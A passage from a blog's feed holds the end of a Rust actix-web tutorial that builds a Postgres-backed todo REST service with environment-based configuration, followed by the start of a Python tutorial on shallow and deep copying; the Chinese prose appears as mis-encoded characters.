checked: <span class="type">bool</span>,</span><br><span class="line">    <span class="keyword">pub</span> list_id: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¢åŠ  <code>db.rs</code> ç”¨äºç®¡ç†æ•°æ®æ“ä½œï¼Œä¾‹å¦‚ <code>get_todos</code> ä»æ•°æ®åº“ä¸­è·å–æ•°æ®å¹¶åºåˆ—åŒ–ä¸º <code>TodoList</code> çš„æ•°ç»„ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::models::&#123;TodoItem, TodoList&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::Client;</span><br><span class="line"><span class="keyword">use</span> std::io::Error;</span><br><span class="line"><span class="keyword">use</span> tokio_postgres::Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†æ¯æ¡è®°å½•è½¬ä¸º TodoList</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">row_to_todo</span>(row: &amp;Row) <span class="punctuation">-&gt;</span> TodoList &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">id</span>: <span class="type">i32</span> = row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">title</span>: <span class="type">String</span> = row.<span class="title function_ invoke__">get</span>(<span class="number">1</span>);</span><br><span class="line">    TodoList &#123; id, title &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_todos</span>(client: &amp;Client) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;TodoList&gt;, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">statement</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from todo_list order by id desc&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">query</span>(&amp;statement, &amp;[])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error getting todo lists&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">iter</span>()</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| <span class="title function_ invoke__">row_to_todo</span>(row))</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;TodoList&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(todos)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¢åŠ  <code>handlers.rs</code> ç”¨äºå¤„ç†æœåŠ¡ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::db::get_todos;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;web, HttpResponse, Responder&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::&#123;Client, Pool&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(db_pool: web::Data&lt;Pool&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = db_pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = <span class="title function_ invoke__">get_todos</span>(&amp;client).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">match</span> result &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(todos) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todos),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œåœ¨ <code>main.rs</code> ä¸­åˆ›å»ºè¿æ¥æ± å¹¶æ·»åŠ è·¯ç”±ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> db;</span><br><span class="line"><span class="keyword">mod</span> handlers;</span><br><span class="line"><span class="keyword">mod</span> models;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;get, web, App, HttpServer, Responder&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres;</span><br><span class="line"><span class="keyword">use</span> handlers::todos;</span><br><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> tokio_postgres::&#123;<span class="keyword">self</span>, NoTls&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="built_in">format!</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Starting server at http://127.0.0.1:8000&quot;</span>);</span><br><span class="line">    <span class="comment">// åˆ›å»ºè¿æ¥æ± </span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cfg</span> = tokio_postgres::Config::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    cfg.<span class="title function_ invoke__">host</span>(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">port</span>(<span class="number">5432</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">user</span>(<span class="string">&quot;actix&quot;</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">password</span>(<span class="string">&quot;actix&quot;</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">dbname</span>(<span class="string">&quot;actix&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">mgr</span> = deadpool_postgres::Manager::<span class="title function_ invoke__">new</span>(cfg, NoTls);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = deadpool_postgres::Pool::<span class="title function_ invoke__">new</span>(mgr, <span class="number">100</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(pool.<span class="title function_ invoke__">clone</span>())</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todos))</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_ invoke__">bind</span>(<span class="string">&quot;127.0.0.1:8000&quot;</span>)?</span><br><span class="line">    .<span class="title function_ invoke__">run</span>()</span><br><span class="line">    .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¹¶æµ‹è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo run</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¦ä¸€ä¸ªæ€»ç«¯ï¼Œjq ç”¨äºæ ¼å¼åŒ–è¿”å›çš„ json</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:8000/todos | jq</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;: 2,</span><br><span class="line">    &quot;title&quot;: &quot;List 2&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;: 1,</span><br><span class="line">    &quot;title&quot;: &quot;List 1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2><span id="liang-ge-gai-jin">ä¸¤ä¸ªæ”¹è¿›</span></h2><ol><li>æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­ä¼šä½¿ç”¨ç¯å¢ƒå˜é‡è¿›è¡Œè®¾ç½®</li></ol><p>æ·»åŠ  <code>.env</code> é…ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯å’ŒæœåŠ¡ç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SERVER.HOST=127.0.0.1</span><br><span class="line">SERVER.PORT=8000</span><br><span class="line">PG.USER=actix</span><br><span class="line">PG.PASSWORD=actix</span><br><span class="line">PG.HOST=127.0.0.1</span><br><span class="line">PG.PORT=5432</span><br><span class="line">PG.DBNAME=actix</span><br><span class="line">PG.POOL.MAX_SIZE=30</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œé€šè¿‡ç¯å¢ƒå˜é‡è·å–å¯¹åº”é…ç½®ã€‚é¦–å…ˆå¢åŠ  <code>dotenv</code> å’Œ <code>config</code> ä¾èµ–ï¼š</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="comment"># ... çœç•¥</span></span><br><span class="line"><span class="attr">dotenv</span> = <span class="string">&quot;0.15.0&quot;</span></span><br><span class="line"><span class="attr">config</span> = <span class="string">&quot;0.10.1&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¢åŠ  <code>config.rs</code>ï¼Œå¢åŠ ä»ç¯å¢ƒå˜é‡ä¸­è·å–é…ç½®å¹¶ç”Ÿæˆè¿æ¥æ± æ–¹æ³• <code>from_env</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> config::&#123;<span class="keyword">self</span>, ConfigError&#125;;</span><br><span class="line"><span class="keyword">use</span> serde::Deserialize;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize, Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">ServerConfig</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> host: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> port: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize, Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> server: ServerConfig,</span><br><span class="line">    <span class="keyword">pub</span> pg: deadpool_postgres::Config,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">from_env</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="keyword">Self</span>, ConfigError&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cfg</span> = config::Config::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        cfg.<span class="title function_ invoke__">merge</span>(config::Environment::<span class="title function_ invoke__">new</span>())?;</span><br><span class="line">        cfg.<span class="title function_ invoke__">try_into</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ <code>main.rs</code> ä¸­ä½¿ç”¨ç¯å¢ƒå˜é‡åˆ›å»ºè¿æ¥æ± ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> dotenv::dotenv;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="comment">// ç¯å¢ƒå˜é‡</span></span><br><span class="line">    <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">    <span class="comment">// è¿æ¥æ± </span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">cfg</span> = crate::config::Config::<span class="title function_ invoke__">from_env</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = cfg.pg.<span class="title function_ invoke__">create_pool</span>(NoTls).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(</span><br><span class="line">        <span class="string">&quot;Starting server at http://&#123;&#125;:&#123;&#125;&quot;</span>,</span><br><span class="line">        cfg.server.host, cfg.server.port</span><br><span class="line">    );</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(pool.<span class="title function_ invoke__">clone</span>())</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todos))</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_ invoke__">bind</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>, cfg.server.host, cfg.server.port))?</span><br><span class="line">    .<span class="title function_ invoke__">run</span>()</span><br><span class="line">    .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>db.rs</code> ä¸­ <code>row_to_todo</code> å‡½æ•°å¤ªéº»çƒ¦ï¼Œä½¿ç”¨ <code>tokio_pg_mapper</code> åšå¤„ç†ï¼Œç®€åŒ–æ“ä½œï¼š</li></ol><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="comment"># ... çœç•¥</span></span><br><span class="line"><span class="attr">tokio-pg-mapper</span> = <span class="string">&quot;0.1&quot;</span></span><br><span class="line"><span class="attr">tokio-pg-mapper-derive</span> = <span class="string">&quot;0.1&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>models.rs</code> ä¸­æ·»åŠ  <code>PostgresMapper</code>ï¼Œ</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_pg_mapper_derive::PostgresMapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize, PostgresMapper)]</span></span><br><span class="line"><span class="meta">#[pg_mapper(table = <span class="string">&quot;todo_list&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoList</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize, PostgresMapper)]</span></span><br><span class="line"><span class="meta">#[pg_mapper(table = <span class="string">&quot;todo_item&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoItem</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> checked: <span class="type">bool</span>,</span><br><span class="line">    <span class="keyword">pub</span> list_id: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>from_row_ref</code> æ–¹æ³•å°†è®°å½•è¿›è¡Œè½¬æ¢ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">use</span> tokio_pg_mapper::FromTokioPostgresRow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_todos</span>(client: &amp;Client) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;TodoList&gt;, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ... çœç•¥</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">query</span>(&amp;statement, &amp;[])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error getting todo lists&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">iter</span>()</span><br><span class="line">        <span class="comment">// ä¿®æ”¹</span></span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| TodoList::<span class="title function_ invoke__">from_row_ref</span>(row).<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;TodoList&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(todos)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">å°ç»“</span></h2><ol><li>åˆ›å»º hello world ç¨‹åºï¼›</li><li>åˆ›å»ºæ•°æ®åº“è¿æ¥å’Œè·å–æ•°æ®ï¼›</li><li>ä½¿ç”¨ç¯å¢ƒå˜é‡ï¼›</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">å‚è€ƒæ–‡æ¡£å’Œé¡¹ç›®</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://github.com/actix/examples">actix/example</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/105#issuecomment-712695653"><strong>qiwihui</strong></a> on: <strong>10/20/2020</strong></p></blockquote><p>cool</p>]]></content>
    
    <summary type="html">
    
      ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆä¸€ï¼‰â”€â”€ Hello world å’Œ REST æ¥å£
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>20. æµ…æ‹·è´å’Œæ·±æ‹·è´ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-131/"/>
    <id>https://qiwihui.com/qiwihui-blog-131/</id>
    <published>2022-08-13T01:54:25.440Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨Pythonä¸­ï¼Œèµ‹å€¼è¯­å¥ï¼ˆ<code>obj_b = obj_a</code>ï¼‰ä¸ä¼šåˆ›å»ºçœŸå®å‰¯æœ¬ã€‚ å®ƒä»…ä½¿ç”¨ç›¸åŒçš„å¼•ç”¨åˆ›å»ºä¸€ä¸ªæ–°å˜é‡ã€‚ å› æ­¤ï¼Œå½“ä½ æƒ³åˆ¶ä½œå¯å˜å¯¹è±¡ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼‰çš„å®é™…å‰¯æœ¬å¹¶ä¸”æƒ³è¦åœ¨ä¸å½±å“åŸå§‹å¯¹è±¡çš„æƒ…å†µä¸‹ä¿®æ”¹å‰¯æœ¬æ—¶ï¼Œå¿…é¡»æ ¼å¤–å°å¿ƒã€‚</p><p>å¯¹äºâ€œçœŸå®â€å‰¯æœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>copy</code> æ¨¡å—ã€‚ ä½†æ˜¯ï¼Œå¯¹äºå¤åˆ/åµŒå¥—å¯¹è±¡ï¼ˆä¾‹å¦‚åµŒå¥—åˆ—è¡¨æˆ–å­—å…¸ï¼‰å’Œè‡ªå®šä¹‰å¯¹è±¡ï¼Œ<strong>æµ…æ‹·è´</strong>å’Œ<strong>æ·±æ‹·è´</strong>ä¹‹é—´å­˜åœ¨é‡è¦åŒºåˆ«ï¼š</p><ul><li>æµ…æ‹·è´ï¼š <em>ä»…æ·±ä¸€å±‚</em>ã€‚ å®ƒåˆ›å»ºä¸€ä¸ªæ–°çš„é›†åˆå¯¹è±¡ï¼Œå¹¶ä½¿ç”¨å¯¹åµŒå¥—å¯¹è±¡çš„å¼•ç”¨æ¥å¡«å……å®ƒã€‚ è¿™æ„å‘³ç€ä¿®æ”¹å‰¯æœ¬ä¸­åµŒå¥—å¯¹è±¡çš„æ·±åº¦è¶…è¿‡ä¸€å±‚ä¼šå½±å“åŸå§‹å¯¹è±¡ã€‚</li><li>æ·±æ‹·è´ï¼š <em>å®Œæ•´çš„ç‹¬ç«‹å…‹éš†</em>ã€‚ å®ƒåˆ›å»ºä¸€ä¸ªæ–°çš„é›†åˆå¯¹è±¡ï¼Œç„¶åé€’å½’åœ°ä½¿ç”¨åœ¨åŸå§‹å¯¹è±¡ä¸­æ‰¾åˆ°çš„åµŒå¥—å¯¹è±¡çš„å‰¯æœ¬å¡«å……å®ƒã€‚</li></ul><span id="more"></span><h3><span id="fu-zhi-cao-zuo">èµ‹å€¼æ“ä½œ</span></h3><p>è¿™åªä¼šåˆ›å»ºå…·æœ‰ç›¸åŒå¼•ç”¨çš„æ–°å˜é‡ã€‚ ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªä¼šå½±å“å¦ä¸€ä¸ªã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">list_b = list_a</span><br><span class="line"></span><br><span class="line">list_a[<span class="number">0</span>] = -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure><h3><span id="qian-kao-bei">æµ…æ‹·è´</span></h3><p>ä¸€å±‚æ·±ã€‚ åœ¨çº§åˆ«1ä¸Šè¿›è¡Œä¿®æ”¹ä¸ä¼šå½±å“å…¶ä»–åˆ—è¡¨ã€‚ ä½¿ç”¨ <code>copy.copy()</code> æˆ–ç‰¹å®šäºå¯¹è±¡çš„å¤åˆ¶å‡½æ•°/å¤åˆ¶æ„é€ å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">list_a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">list_b = copy.copy(list_a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ä¼šå½±å“å…¶ä»–åˆ—è¡¨</span></span><br><span class="line">list_b[<span class="number">0</span>] = -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯¹äºåµŒå¥—å¯¹è±¡ï¼Œåœ¨2çº§æˆ–æ›´é«˜çº§åˆ«ä¸Šè¿›è¡Œä¿®æ”¹ç¡®å®ä¼šå½±å“å…¶ä»–å¯¹è±¡ï¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">list_a = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">list_b = copy.copy(list_a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¼šå½±å“å…¶ä»–åˆ—è¡¨!</span></span><br><span class="line">list_a[<span class="number">0</span>][<span class="number">0</span>]= -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">[[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä½ è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å†…å®¹æ¥åˆ›å»ºæµ…æ‹·è´ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æµ…æ‹·è´</span></span><br><span class="line">list_b = <span class="built_in">list</span>(list_a)</span><br><span class="line">list_b = list_a[:]</span><br><span class="line">list_b = list_a.copy()</span><br></pre></td></tr></table></figure><h3><span id="shen-kao-bei">æ·±æ‹·è´</span></h3><p>å®Œå…¨ç‹¬ç«‹çš„å…‹éš†ã€‚ ä½¿ç”¨ <code>copy.deepcopy()</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">list_a = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">list_b = copy.deepcopy(list_a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸å½±å“å…¶ä»–</span></span><br><span class="line">list_a[<span class="number">0</span>][<span class="number">0</span>]= -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">[[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br></pre></td></tr></table></figure><h3><span id="zi-ding-yi-dui-xiang">è‡ªå®šä¹‰å¯¹è±¡</span></h3><p>ä½ å¯ä»¥ä½¿ç”¨ <code>copy</code> æ¨¡å—æ¥è·å–è‡ªå®šä¹‰å¯¹è±¡çš„æµ…æ‹·è´æˆ–æ·±æ‹·è´ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">                </span><br><span class="line"><span class="comment"># åªå¤åˆ¶å¼•ç”¨</span></span><br><span class="line">p1 = Person(<span class="string">&#x27;Alex&#x27;</span>, <span 